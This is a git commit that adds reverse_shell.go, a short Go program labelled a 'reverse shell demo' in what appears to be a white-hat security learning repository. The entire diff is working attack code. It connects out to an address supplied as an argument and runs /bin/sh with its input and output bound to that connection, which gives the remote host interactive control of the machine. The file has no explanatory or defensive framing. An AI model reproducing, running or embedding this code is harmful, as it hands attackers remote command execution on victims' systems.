eef530e28c2fcf8508f30891ffb87f7b1180e0e5
TesterCC <testerlyx@foxmail.com>
2022-11-02 22:48:01 +0800

    update - reverse shell demo

---
+++ whitehat_sec_dev/bind_shell/reverse_shell.go
@@ -0,0 +1,37 @@
+package main
+
+import (
+	"fmt"
+	"log"
+	"net"
+	"os"
+	"os/exec"
+)
+
+var (
+	shell    = "/bin/sh"
+	remoteIp string
+)
+
+func main() {
+	if len(os.Args) < 2 {
+		fmt.Println("Usage: " + os.Args[0] + "<remoteAddress>")
+		os.Exit(1)
+	}
+
+	remoteIp = os.Args[1]
+	remoteConn, err := net.Dial("tcp", remoteIp)
+	if err != nil {
+		log.Fatal("Connection Error: ", err)
+	}
+
+	_, _ = remoteConn.Write([]byte("[+] reverse shell demo \n"))
+
+	command := exec.Command(shell)
+	command.Env = os.Environ()
+	command.Stdin = remoteConn
+	command.Stdout = remoteConn
+	command.Stderr = remoteConn
+	_ = command.Run()
+
+}
